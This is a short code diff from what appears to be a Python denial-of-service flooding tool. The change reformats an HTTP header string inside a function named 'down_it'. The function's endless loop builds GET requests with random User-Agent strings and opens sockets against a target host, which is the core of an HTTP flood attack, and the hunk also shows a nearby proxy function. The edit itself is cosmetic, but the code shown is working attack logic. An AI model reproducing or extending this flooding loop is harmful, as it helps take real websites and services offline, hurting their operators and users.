@@ -18,12 +18,11 @@ def proxy():
 
 def down_it():
     try:
-        data = """
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-us,en;q=0.5
-        Accept-Encoding: gzip,deflate
-        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
-        Connection: keep-alive"""
+        data = """Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Connection: keep-alive"""
         while True:
             packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
